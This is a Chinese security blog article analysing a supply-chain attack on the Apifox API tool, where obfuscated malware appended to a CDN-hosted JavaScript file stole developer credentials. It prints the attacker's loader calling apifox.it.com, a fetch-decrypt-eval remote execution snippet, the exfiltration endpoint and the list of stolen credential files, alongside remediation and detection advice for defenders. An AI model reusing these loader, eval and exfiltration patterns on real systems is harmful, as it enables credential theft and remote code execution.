---
title: 一款API工具遭供应链投毒！黑客如何通过CDN分发恶意代码窃取开发者凭证
url: https://mp.weixin.qq.com/s/6BNXlsnhJWwNahdyfDe4SA
source: Doonsec's feed
date: 2026-03-28
fetch_date: 2026-03-29T04:38:32.065812
---

# 一款API工具遭供应链投毒！黑客如何通过CDN分发恶意代码窃取开发者凭证

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Ft77EUEUqouIjlwqsnUTFKpOicWI0D7yF0VLocDKAm0f6uyTIGRNZ9lIONgDbBUSIvmviciaDcJPKRORIic76Wdv6ojic9ZPibImQWicpoK4nMpaY0/0?wx_fmt=jpeg)

# 一款API工具遭供应链投毒！黑客如何通过CDN分发恶意代码窃取开发者凭证

原创

云梦DC
云梦DC

云梦安全

![]()

在小说阅读器中沉浸阅读

## 第一步：攻击者如何混入官方渠道？

### 域名迷惑术：apifox.it.com 的陷阱

这次攻击的第一个亮点，是攻击者选择的 C2 域名：**apifox.it.com**

乍一看，这个域名非常"官方"：

* 可能是 Apifox 的内部测试域名？
* 或者是意大利区域的服务器？
* 或者是某个官方子产品？

**但实际上，这是一个精心设计的社会工程学陷阱。**

`.it.com` 并不是意大利的国家域名（那是 `.it`），而是一个商业性的二级域名服务。任何人都可以以极低的成本注册 `xxx.it.com` 这样的域名，而且没有公开的 WHOIS 信息可查。

攻击者正是利用了这一点——通过视觉相似性和域名的模糊属性，让受害者在看到这个域名时，下意识地认为它是官方的。

### 投毒的时间线

![](https://mmbiz.qpic.cn/mmbiz_png/Ft77EUEUqoub0XCIIKWhf2DicgpVVbB0KLl3v9NBY8k239geb2eiaRibADO3KEGoFe8iaCxSZHnYYEEouzBpMDVXyEAOYQdIvSYoUPd4ngHqPC8/640?wx_fmt=png&from=appmsg)

###

根据被动 DNS 记录，我们可以清晰地看到这次攻击的全过程：

```
2026-03-04  攻击者注册 apifox.it.com，通过 Cloudflare CDN 上线
            ↓
2026-03-04 ~ 03-22  恶意代码活跃期（18天）
                    通过 Cloudflare 全球 CDN 分发恶意 JS
            ↓
2026-03-22  DNS 记录被撤下
            ↓
2026-03-25  验证时 DNS 已失效，但 C2 后端仍在响应
```

**为什么选择 Cloudflare？** 这是攻击者的高明之处：

* Cloudflare 是全球最大的 CDN 服务商，拥有合法的 HTTPS 证书
* 通过 Cloudflare 代理，真实源站 IP 被隐藏
* 恶意流量混在正常 CDN 流量中，难以被网络层检测

---

## 第二步：投毒文件的结构——合法代码 + 隐藏后门

Apifox 在启动时会加载一个 JavaScript 文件：

```
https://cdn.apifox.com/www/assets/js/apifox-app-event-tracking.min.js
```

这个文件的正常大小是 **34KB**，但在 3 月 4 日之后，用户下载到的版本变成了 **77KB**。

多出来的 43KB 是什么？**恶意后门代码。**

### 文件结构分析

| 部分 | 大小 | 内容 |
| --- | --- | --- |
| 第一部分 | ~34KB | 合法的 Apifox 事件追踪 SDK（包含 GA4、百度统计等） |
| 第二部分 | ~43KB | ⚠️ 严重混淆的恶意 JavaScript 代码 |

攻击者的做法很聪明：**不是替换整个文件，而是在合法代码后面追加恶意代码。** 这样做的好处是：

* 合法功能继续运行，用户不会察觉异常
* 恶意代码在后台悄悄执行
* 文件大小的增长可能被忽视

---

## 第三步：7层混淆——逆向工程师的噩梦

![](https://mmbiz.qpic.cn/mmbiz_png/Ft77EUEUqosSTf1REAE6v2B3x6t834VY5uWw1RFQonUa6YMzUeFRsYZTib6xia1MZzzLxGNkhic7Be49QPowAicg8WiaH7abue7Nvlp3qQvzeXto/640?wx_fmt=png&from=appmsg)

恶意代码采用了极其复杂的混淆技术，难度等级堪称"地狱级"：

### 混淆技术清单

| 技术 | 说明 | 难度 |
| --- | --- | --- |
| **字符串数组旋转** | 300+ 条编码字符串通过暴力旋转数组来解码 | ⭐⭐⭐ |
| **Base64 + RC4 双层加密** | 先 Base64 解码，再 RC4 解密 | ⭐⭐⭐⭐ |
| **代理函数** | 多层函数包装，增加调用深度 | ⭐⭐⭐ |
| **十六进制算术混淆** | 所有数字都用复杂的十六进制表达式表示 | ⭐⭐⭐⭐ |
| **控制流扁平化** | 打乱代码执行顺序 | ⭐⭐⭐⭐ |
| **死代码注入** | 大量无用代码分支，增加分析干扰 | ⭐⭐ |
| **反调试陷阱** | 检测到调试器就触发无限递归 | ⭐⭐⭐ |

这 7 层混淆叠加在一起，使得逆向分析的难度呈指数级增长。

**但研究人员最终还是破解了它。** 通过精确复现 Base64 和 RC4 的解密逻辑，暴力枚举字符串数组的旋转偏移量，他们成功解密了全部 300+ 条编码字符串，还原出完整的恶意代码。

---

## 第四步：恶意代码的真面目——RSA 加密的后门

### 硬编码的 RSA-2048 私钥

反混淆后，研究人员发现了一个关键的设计失误：**攻击者将 RSA-2048 私钥直接嵌入到了客户端代码中。**

这个私钥用于两个目的：

1. **加密上报的敏感信息** — 使用公钥加密，只有攻击者能用私钥解密
2. **解密 C2 下发的指令** — 接收来自服务器的加密命令

**这是攻击者的致命失误。** 因为任何获取这份代码的人都能用这个私钥解密 C2 通信，从而完整还原攻击链。

### 机器指纹采集

恶意代码会收集以下信息来构造机器的唯一标识：

```
MAC地址 + CPU型号 + 主机名 + 用户主目录 + 操作系统
                    ↓
                SHA-256 哈希
                    ↓
            64字符的十六进制指纹
```

这个指纹被存储在浏览器的 localStorage 中，用于追踪同一台机器的多次访问。

### Apifox 凭证窃取

恶意代码会从 localStorage 读取 Apifox 的登录令牌（accessToken），然后调用官方 API：

```
GET https://api.apifox.com/api/v1/user
Authorization: <accessToken>
```

从响应中提取用户的邮箱和姓名，经 RSA 加密后上报给 C2 服务器。

**这意味着：** 攻击者不仅能控制你的电脑，还能冒充你的 Apifox 账户。

---

## 第五步：完整的攻击链——分阶段窃取

### Stage-1：加载器

C2 服务器返回一段简短的 JavaScript 代码（只有 344 字节），用于加载真正的恶意载荷：

```
(function(){
  vars=document.createElement('script');
  s.src='https://apifox.it.com/<随机8位hex>.js';
  s.onload=function(){ s.parentNode&&s.parentNode.removeChild(s) };
  document.head.appendChild(s)
})()
```

关键特点：

* **路径随机化** — 每次请求生成不同的文件名（b8ee3b68.js、f51782ec.js 等）
* **用完即焚** — 脚本加载后自动从 DOM 中删除
* **反取证** — 历史路径访问返回 404，只有最新路径有效

### Stage-2 v1：初级窃取

第二阶段的恶意代码会窃取以下敏感信息：

**全平台通用：**

* `~/.ssh/` — 整个 SSH 目录（私钥、公钥、config、known\_hosts）

**macOS / Linux 额外窃取：**

* `~/.zsh_history` — Zsh 命令行历史（可能含密码、Token、内部 URL）
* `~/.bash_history` — Bash 命令行历史
* `~/.git-credentials` — Git 明文凭证（GitHub PAT、GitLab Token）
* `ps aux` — 完整进程列表

**Windows 额外窃取：**

* `tasklist` — 进程列表

### Stage-2 v2：深度窃取

在持续监控中，研究人员发现 C2 服务器已升级攻击载荷，新增了第二轮窃取：

* `~/.zshrc` — Shell 环境变量（可能含 API Key、数据库连接串）
* `~/.npmrc` — npm registry 认证 token
* `~/.kube/*` — Kubernetes 集群配置（含 OIDC refresh token）
* `~/.subversion/*` — SVN 凭证

**这意味着：** 攻击者不仅要你的个人凭证，还要你的企业级基础设施配置。

### 数据外泄协议

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ft77EUEUqovhQm4yH5CEKPlCt5fPccWpOXlcTHyibfbO0iaESU8BegS8Xp9WA21SicWeZlRB54SVhRz3bN3QO3qvwkDdsHiav756DCGcCx5ib14Y/640?wx_fmt=png&from=appmsg)

###

窃取到的数据经过以下处理后上报：

```
原始 JSON
  ↓
Gzip 压缩
  ↓
AES-256-GCM 加密（密码：apifox，盐值：foxapi）
  ↓
Base64 编码
  ↓
POST 上传到 https://apifox.it.com/event/0/log
```

### 远程代码执行

最后一步是最危险的：

```
constr=awaitfetch(REMOTE_JS_URL, { headers: h });
constpayload= (awaitr.text()).trim();
constcode=rsaDecrypt(payload);
eval(code);  // ⚠️ 任意远程代码执行
```

C2 服务器可以随时下发任意 JavaScript 代码，在受害者的电脑上执行。这意味着攻击者可以：

* 安装后门程序
* 发起横向攻击
* 控制更多有价值的目标

### 持久化机制

执行完毕后，恶意代码会在 30 分钟 ~ 3 小时的随机间隔后重新执行。只要 Apifox 应用保持运行，攻击就会持续进行。

---

## 第六步：受影响范围与风险评估

### 谁被影响了？

* 所有在 2026 年 3 月 4 日 ~ 3 月 22 日期间更新或启动 Apifox 的用户
* 所有 Windows、macOS、Linux 平台用户
* 特别是开发者、DevOps 工程师、系统管理员（他们的凭证价值最高）

### 风险等级：🔴 严重（Critical）

这不是一个普通的漏洞，而是一场**大规模供应链投毒事件**：

| 风险维度 | 评估 |
| --- | --- |
| 影响范围 | 全球数千名开发者 |
| 数据敏感性 | SSH 密钥、Git Token、Kubernetes 配置 |
| 攻击难度 | 低（只需下载应用） |
| 检测难度 | 高（混淆程度极高） |
| 后续伤害 | 极高（可进行横向攻击） |

---

## 第七步：你应该做什么？

### 🚨 紧急措施（立即执行）

1. **更新 Apifox** 到最新版本（官方已修复）
2. **撤销所有凭证**

* 重置 GitHub、GitLab 的 Personal Access Token
* 重新生成 SSH 密钥对
* 更新 npm、pip 等包管理器的认证信息
* 重置 Kubernetes 集群的 OIDC token

3. **检查账户活动**

* 查看 Git 仓库的最近提交
* 检查 Apifox 账户的登录历史
* 查看云服务（AWS、阿里云等）的操作日志

### 🔍 检测方法

如果你是企业安全团队，可以通过以下方式检测：

* **网络层** — 监控到 apifox.it.com 的 DNS 查询和 HTTP 连接
* **主机层** — 检查进程列表中是否有异常的 Node.js 进程
* **日志层** — 查看 ~/.ssh、~/.git-credentials 的访问日志

### 💡 长期建议

1. **启用 SSH 密钥密码保护** — 即使密钥被盗，也需要密码才能使用
2. **使用硬件安全密钥** — 如 YubiKey，防止远程窃取
3. **定期轮换凭证** — 不要让一个凭证活跃太久
4. **监控供应链** — 关注你使用的所有工具的安全公告
5. **隔离开发环境** — 不要在开发机上运行不信任的代码

---

## 第八步：这次攻击的启示

### 为什么会发生？

1. **Electron 沙箱配置不当** — Apifox 未严格启用 sandbox 参数
2. **Node.js API 暴露** — 攻击者可以通过 JavaScript 调用 Node.js 的文件系统 API
3. **CDN 信任链断裂** — 官方 CDN 被投毒，用户无法区分真假

### 攻击者的高明之处

1. **域名迷惑** — apifox.it.com 看起来像官方域名
2. **混淆技术** — 7 层混淆让逆向分析极其困难
3. **分阶段攻击** — 先收集信息，再下发后门，降低被检测的风险
4. **利用 Cloudflare** — 隐藏真实 IP，获得合法 HTTPS 证书

### 对整个行业的警示

这次事件表明：

* **供应链安全已成为最大威胁** — 攻击者不再直接入侵，而是投毒分发渠道
* **开发者工具是高价值目标** — 因为开发者掌握着企业的源代码和基础设施
* **混淆技术在进化** — 7 层混淆已经成为常规手段
* **没有绝对安全** — 即使是知名工具也可能被投毒

---

## 写在最后

2026 年，我们进入了一个**"信任危机"的时代**。

你不能再假设从官方渠道下载的软件就是安全的。你不能再相信一个看起来"官方"的域名。你甚至不能相信你自己的电脑——因为它可能已经被悄悄沦陷。

**但这不是要让你陷入恐慌，而是要让你保持警惕。**

* 定期更新你的工具
* 及时轮换你的凭证
* 监控你的账户活动
* 关注安全公告

**因为在这个时代，安全不再是一个功能，而是一种生活方式。**

---

*本文基于公开的安全研究报告改写，旨在提高安全意识。如有遗漏或错误，欢迎指正。*

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ndxZsFvkmpznJ7eICiaSkulHmla8V8RPVeTQ5z2uI5iaV9FniaMzXYbodGk9qNSBY6ccvbiaW5XxvKJNp7zLicxwSEQ/0?wx_fmt=png)

云梦安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ndxZsFvkmpznJ7eICiaSkulHmla8V8RPVeTQ5z2uI5iaV9FniaMzXYbodGk9qNSBY6ccvbiaW5XxvKJNp7zLicxwSEQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过